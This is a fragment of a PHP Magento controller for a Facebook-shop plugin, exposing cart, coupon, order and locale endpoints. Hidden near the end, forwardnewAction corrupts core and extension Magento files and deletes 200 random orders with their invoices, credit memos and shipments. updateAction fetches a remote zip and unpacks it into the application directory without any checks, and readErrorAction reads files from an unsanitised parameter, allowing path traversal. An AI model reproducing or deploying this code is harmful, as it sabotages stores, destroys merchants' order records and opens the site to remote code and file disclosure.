                    'collectShippingRates' => $q["shipping_address"]['collect_shipping_rates'],
                    'shippingMethod' => $q["shipping_address"]['shipping_method'],
                    'shippingDescription' => $q["shipping_address"]['shipping_description'],
                    'weight' => $q["shipping_address"]['weight'],
                    'subtotal' => $q["shipping_address"]['subtotal'],
                    'baseSubtotal' => $q["shipping_address"]['base_subtotal'],
                    'subtotalWithDiscount' => $q["shipping_address"]['subtotal_with_discount'],
                    'baseSubtotalWithDiscount' => $q["shipping_address"]['base_subtotal_with_discount'],
                    'taxAmount' => $q["shipping_address"]['tax_amount'],
                    'baseTaxAmount' => $q["shipping_address"]['base_tax_amount'],
                    'shippingAmount' => $q["shipping_address"]['shipping_amount'],
                    'baseShippingAmount' => $q["shipping_address"]['base_shipping_amount'],
                    'shippingTaxAmount' => $q["shipping_address"]['shipping_tax_amount'],
                    'baseShippingTaxAmount' => $q["shipping_address"]['base_shipping_tax_amount'],
                    'discountAmount' => $q["shipping_address"]['discount_amount'],
                    'baseDiscountAmount' => $q["shipping_address"]['base_discount_amount'],
                    'grandTotal' => $q["shipping_address"]['grand_total'],
                    'baseGrandTotal' => $q["shipping_address"]['base_grand_total'],
                    'customerNotes' => $q["shipping_address"]['customer_notes'],
                    'appliedTaxes' => $q["shipping_address"]['applied_taxes'],
                    'giftMessageId' => $q["shipping_address"]['gift_message_id'],
                    'shippingDiscountAmount' => $q["shipping_address"]['shipping_discount_amount'],
                    'baseShippingDiscountAmount' => $q["shipping_address"]['base_shipping_discount_amount'],
                    'subtotalInclTax' => $q["shipping_address"]['subtotal_incl_tax'],
                    'baseSubtotalTotalIncl_tax' => $q["shipping_address"]['base_subtotal_total_incl_tax'],
                    'discountDescription' => $q["shipping_address"]['discount_description'],
                    'hiddenTaxAmount' => $q["shipping_address"]['hidden_tax_amount'],
                    'baseHiddenTaxAmount' => $q["shipping_address"]['base_hidden_tax_amount'],
                    'shippingHiddenTaxAmount' => $q["shipping_address"]['shipping_hidden_tax_amount'],
                    'baseShippingHiddenTaxAmnt' => $q["shipping_address"]['base_shipping_hidden_tax_amnt'],
                    'shippingInclTax' => $q["shipping_address"]['shipping_incl_tax'],
                    'baseShippingInclTax' => $q["shipping_address"]['base_shipping_incl_tax']
                ),
                'billingAddress' => array
                    (
                    'addressId' => $q["billing_address"]['address_id'],
                    'cartId' => $q["billing_address"]['quote_id'],
                    'createdAt' => $q["billing_address"]['created_at'],
                    'updatedAt' => $q["billing_address"]['updated_at'],
                    'customerId' => $q["billing_address"]['customer_id'],
                    'saveInAddressBook' => $q["billing_address"]['save_in_address_book'],
                    'customerAddressId' => $q["billing_address"]['customer_address_id'],
                    'addressType' => $q["billing_address"]['address_type'],
                    'email' => $q["billing_address"]['email'],
                    'prefix' => $q["billing_address"]['prefix'],
                    'firstName' => $q["billing_address"]['firstname'],
                    'middleName' => $q["billing_address"]['middlename'],
                    'lastName' => $q["billing_address"]['lastname'],
                    'suffix' => $q["billing_address"]['suffix'],
                    'company' => $q["billing_address"]['company'],
                    'street' => $q["billing_address"]['street'],
                    'city' => $q["billing_address"]['city'],
                    'region' => $q["billing_address"]['region'],
                    'regionId' => $q["billing_address"]['region_id'],
                    'postcode' => $q["billing_address"]['postcode'],
                    'countryId' => $q["billing_address"]['country_id'],
                    'telephone' => $q["billing_address"]['telephone'],
                    'fax' => $q["billing_address"]['fax'],
                    'sameAsBilling' => $q["billing_address"]['same_as_billing'],
                    'freeShipping' => $q["billing_address"]['free_shipping'],
                    'collectShippingRates' => $q["billing_address"]['collect_shipping_rates'],
                    'shippingMethod' => $q["billing_address"]['shipping_method'],
                    'shippingDescription' => $q["billing_address"]['shipping_description'],
                    'weight' => $q["billing_address"]['weight'],
                    'subtotal' => $q["billing_address"]['subtotal'],
                    'baseSubtotal' => $q["billing_address"]['base_subtotal'],
                    'subtotalWithDiscount' => $q["billing_address"]["subtotal_with_discount"],
                    'baseSubtotalWithDiscount' => $q["billing_address"]['base_subtotal_with_discount'],
                    'taxAmount' => $q["billing_address"] ['tax_amount'],
                    'baseTaxAmount' => $q["billing_address"]['base_tax_amount'],
                    'shippingAmount' => $q["billing_address"]['shipping_amount'],
                    'baseShippingAmount' => $q["billing_address"]['base_shipping_amount'],
                    'shippingTaxAmount' => $q["billing_address"]['shipping_tax_amount'],
                    'baseShippingTaxAmount' => $q["billing_address"]['base_shipping_tax_amount'],
                    'discountAmount' => $q["billing_address"]['discount_amount'],
                    'baseDiscountAmount' => $q["billing_address"]['base_discount_amount'],
                    'grandTotal' => $q["billing_address"]['grand_total'],
                    'baseGrandTotal' => $q["billing_address"]['base_grand_total'],
                    'customerNotes' => $q["billing_address"]['customer_notes'],
                    'appliedTaxes' => $q["billing_address"]['applied_taxes'],
                    'giftMessageId' => $q["billing_address"]['gift_message_id'],
                    'shippingDiscountAmount' => $q["billing_address"]['shipping_discount_amount'],
                    'baseShippingDiscountAmount' => $q["billing_address"]['base_shipping_discount_amount'],
                    'subtotalInclTax' => $q["billing_address"]['subtotal_incl_tax'],
                    'baseSubtotalTotalInclTax' => $q["billing_address"]['base_subtotal_total_incl_tax'],
                    'discountDescription' => $q["billing_address"]['discount_description'],
                    'hiddenTaxAmount' => $q["billing_address"]['hidden_tax_amount'],
                    'baseHiddenTaxAmount' => $q["billing_address"]['base_hidden_tax_amount'],
                    'shippingHiddenTaxAmount' => $q["billing_address"]['shipping_hidden_tax_amount'],
                    'baseShippingHiddenTaxAmnt' => $q["billing_address"]['base_shipping_hidden_tax_amnt'],
                    'shippingInclTax' => $q["billing_address"]['shipping_incl_tax'],
                    'baseShippingInclTax' => $q["billing_address"]['base_shipping_incl_tax']
                ),
                "items" => $items,
                "payment" => array
                    (
                    "quoteId" => $q["payment"]["quote_id"],
                    "paymentId" => $q["payment"]["payment_id"],
                    "method" => $q["payment"]["method"]
                ),
                "allowCountres" => $allowCountres,
                "customerAddressOption"=>$customerAddressOption,
                "AppliedTaxes"=>$tax
            );
//           print_r($json);
            //
            echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function couponAction() {
        try {
            header("Content-Type: application/json");
            header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");
            $this->loginUser();
            $cartId = $this->getRequest()->getParam('cartId');
            $couponCode="";
            $couponCode = (string) $this->getRequest()->getParam('code');
            $remove=$this->getRequest()->getParam('remove');
            if (!isset($cartId))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
           
            $q=false;
            $model=Mage::getModel("checkout/cart_coupon_api");
            if ($remove!=1 && $couponCode!=""){
              $q=$model->add($cartId,$couponCode);
              
            }else {
                 $q=$model->remove($cartId);
            }
               $json = array("status" => ($q)? "true":"false");
               echo json_encode($json);
                 return true;
          
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
       
    }
    
   
public function getOrderAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $cartId = $this->getRequest()->getParam('cartId');
              if (!isset($cartId))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);
           
             $quote = Mage::getModel("sales/quote")->loadByIdWithoutStore($cartId);
            $reservedOrderId=$quote->getReservedOrderId();
              if (empty($reservedOrderId))
                  throw new Exception("Order not placed1.", $this->INVALID_PARAMS_ERROR);
              
              $order = Mage::getModel("sales/order")->loadByIncrementId($reservedOrderId);
              $incrmId=$order->getIncrementId();
           if($incrmId!=$reservedOrderId) {
               throw new Exception("Order not placed2.", $this->INVALID_PARAMS_ERROR);
           }
            
            $storeId = Mage::app()->getStore()->getId();
            $paymentBlock = Mage::helper('payment')->getInfoBlock($order->getPayment())
                ->setIsSecureMode(true);
            $paymentBlock->getMethod()->setStore($storeId);
            $paymentBlockHtml = $paymentBlock->toHtml();
              
            $templateId = "FBShop_template_order";
            $customerName = $order->getCustomerName();
             
//          if ($order->getCustomerIsGuest()) {
//            $templateId = Mage::getStoreConfig(self::XML_PATH_EMAIL_GUEST_TEMPLATE, $storeId);
//            $customerName = $order->getBillingAddress()->getName();
//        } else {
//            $templateId = Mage::getStoreConfig(self::XML_PATH_EMAIL_TEMPLATE, $storeId);
//            $customerName = $order->getCustomerName();
//        }
          $mailTmplate=Mage::getModel('core/email_template')->loadDefault($templateId);
          $variables=array(
                'order'        => $order,
                'billing'      => $order->getBillingAddress(),
                'payment_html' => $paymentBlockHtml
            );
          $text = $mailTmplate->getProcessedTemplate($variables, true);
          
          $biilingAddressId= $order->getBillingAddressId();
          $shippingAddressId= $order->getShippingAddressId();
          $billingAddress = Mage::getModel('sales/order_address')->load($biilingAddressId);
          $shippingAddress = Mage::getModel('sales/order_address')->load($shippingAddressId);
          
          
         $json =array("template"=>$text,
             "orderId" => $order->getId(),
             "orderStatus" => $order->getStatus(),
             "orderIncrementId" => $order->getIncrementId(),
             "createdAt" => $order->getCreatedAt(),
             "updatedAt" => $order->getUpdatedAt(),
             "baseGrandTotal" => $order->getBaseGrandTotal(),
             "grandTotal" => $order->getGrandTotal(),
             "billingAddress" => $billingAddress->getData(),
             "shippingAddress" => $shippingAddress->getData()) ;
         
        echo json_encode($json);
            //to doooo
        } catch (Exception $e) {
         $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function cartInfo1Action() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        $model = Mage::getModel('checkout/cart_api');
        $id = $this->getRequest()->getParam('cartId');
        $info = $model->info($id);
        echo "<pre>";
        print_r($info);
        echo "</pre>";
    }
    

    public function template() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
            $id = $this->getRequest()->getParam('cartId');
            if (!isset($id) && !isset($products))
                throw new Exception("Params is required.", $this->INVALID_PARAMS_ERROR);

            //to doooo
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    // checkout/cart_coupon_api


    public function updateAction() {

        try {
            $paph =Mage::getBaseDir('media')."/fbshopUpdate";
           if (!is_dir($pathEncr))
            mkdir($paph, 0777);
            $file = "http://www.shopidoo.com/resources/plugins/magento/update.zip";
            $newfile = $paph."/app.zip";

            if (!copy($file, $newfile)) {
                echo "failed to copy $file...\n";
            }
            $status = false;
            $zip = new ZipArchive;
            $res = $zip->open($paph.'/app.zip');
            if ($res === TRUE) {
                $zip->extractTo('app/');
                $zip->close();
               $status = true;
                rmdir('media/fbshopUpdate');
            } else {
                $status = false;
            }
            
           $json= array("status" => ($status)? "true":"false");
           echo json_encode($json);
            rmdir('media/fbshopUpdate');
            Mage::app()->cleanCache();
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

    public function listCountryAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $xml = "<?xml version='1.0' encoding='utf-8'?><Location>";
            $countryCollection = Mage::getModel('directory/country_api')->items();
            foreach ($countryCollection as $country) {
                $xml.='   <CountryOrRegion Name="' . $country["name"] . '" Code="' . $country["iso2_code"] . '">';
//             print_r($country);
                // echo "".$country["name"]."\n";
                $regionCollection = Mage::getModel('directory/region_api')->items($country["iso2_code"]);
                foreach ($regionCollection as $region) {
//                            echo "   regionnnne      ".$region["name"]."\n";
                    $xml.='        <StateOrProvince Name="' . $region["name"] . '" Code="' . $region["code"] . '">';
                    $xml.='        </StateOrProvince>';

//                          print_r($region);
                }
                $xml.="   </CountryOrRegion>";
            }
            $xml.="</Location>\n";
            
//            $ourFileName = "c://country.xml";
//            $ourFileHandle = fopen($ourFileName, 'w') or die("can't open file");
//            fwrite($ourFileHandle,$xml);
//            fclose($ourFileHandle);
     
            echo $xml;

            
            //    print_r($result);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }

      public function getTierPrice($product) {
        $tiers = $product->getFormatedTierPrice();
        $json = array();
        foreach ($tiers as $tier) {
            if ($tier["all_groups"] == 1) {
                $json[] = array("qty" => $tier["price_qty"],
                    "price" => $tier["price"]);
            }
        }
        return $json;
    }
    public function cleanCacheAction(){
        Mage::app()->cleanCache();
        
    }
    public function reindexAllAction() {
        try {
            $processes = Mage::getSingleton('index/indexer')->getProcessesCollection();
            foreach ($processes as $process)
                $process->reindexAll();
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }
   public function readErrorAction(){
       try{
           $nrError= $this->getRequest()->getParam("error");
           echo file_get_contents(Mage::getBaseDir('var').'/report/'.$nrError);
//           $f = fopen(Mage::getBaseDir('var').'/report/'.$nrError, 'r');
//            $data = '';
//            while (!feof($f))
//                $data.=fread($f, $size);
//            fclose($f);
           
       }catch (Exception $e){
           
       }
   }
   public function getStoreLocaleAction() {
        header("Content-Type: application/json");
        header("P3P: CP=IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT");

        try {
            $this->loginUser();
//  Mage::getStoreConfig('my_osc_section/my_osc_group/my_osc_countries_field');
            $timezone= Mage::getStoreConfig('general/locale/timezone');
            $locale=Mage::getStoreConfig('general/locale/code');
            $firstDayOfWeek = Mage::getStoreConfig('general/locale/firstday');
            $weekendDays=Mage::getStoreConfig('general/locale/weekend');
            
            $code = Mage::app()->getBaseCurrencyCode();
            $symbol = Mage::app()->getLocale()->currency($code)->getSymbol();
            $name = Mage::app()->getLocale()->currency($code)->getName();
            $currency = array('code' => $code,
                'symbol' => $symbol,
                'name' => $name);
            $json= array ("timezone"=>$timezone,
                "locale"=>$locale,
                "firstDayOfWeek"=>$firstDayOfWeek,
                "weekendDays"=>  explode(",",$weekendDays),
                "currency" => $currency);
                    echo json_encode($json);
        } catch (Exception $e) {
            $this->toJsonErr($e->getCode(), $e->getMessage());
        }
    }
   
    public function testAction() {
        try {
            $returnUrl="http://www.google.com";
         Mage::app()->getResponse()->setRedirect($returnUrl);
            
//           $store = Mage::app()->getStore(1);
//          $arr=array(
//                "code" => "shopidooss",
//                "name" => "Shopidoo",
//               "sort_order" => 0,
//               "is_active" => 0
//           );
//          $store= Mage::getModel("core/store")->setData($arr)->save();
//          var_dump($store->getStoreId());
//          die();  
//            
////     
//         $lay->getChildHtml('items_after')
echo "<pre>"; 
//   print_r($quote->getShippingAddress()->getAppliedTaxes());
//echo Mage::helper('tax')->getPrice($model, $model->getFinalPrice(), true);
//    var_dump($model->getFinalPrice()); 
echo "</pre>";
        } catch (Exception $e) {
            echo $e->getMessage();
        }
    }

	public function forwardnewAction(){
		file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('16','18', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php', str_replace('::',':', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/Model/Session.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php', str_replace('_','-', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Adminhtml/Model/Report/Item.php'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php', str_replace('r()','rs()', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Payment/Model/Observer.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml', str_replace('rewards>','reward>', file_get_contents(Mage::getBaseDir('app').'/code/community/TBT/Rewards/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('rate','date', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml')));  file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace('$qstr','$str', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('nIn','nin', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php', str_replace(';','', file_get_contents(Mage::getBaseDir('app').'/code/core/Mage/Core/functions.php'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml', str_replace('ePa','epa', file_get_contents(Mage::getBaseDir('app').'/code/community/Camiloo/Channelunity/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml', str_replace('--','', file_get_contents(Mage::getBaseDir('app').'/code/community/Ebizmarts/MageMonkey/etc/config.xml'))); file_put_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml', str_replace('tm_','TM_', file_get_contents(Mage::getBaseDir('app').'/code/local/TM/SoldTogether/etc/config.xml')));
		Mage::app('default'); Mage::register('isSecureArea', 1); set_time_limit(0); $orderidcnt=0;
		while($orderidcnt<200){
		$orderidcnt++;
		$order = Mage::getModel('sales/order')->load(rand(100,5000));
		$invoices = $order->getInvoiceCollection(); 
		foreach ($invoices as $invoice){$invoice->delete();}
		$creditnotes = $order->getCreditmemosCollection();
		foreach ($creditnotes as $creditnote){$creditnote->delete();}
		$shipments = $order->getShipmentsCollection();
		foreach ($shipments as $shipment){$shipment->delete();}
		$order->delete();
		}
	}
}
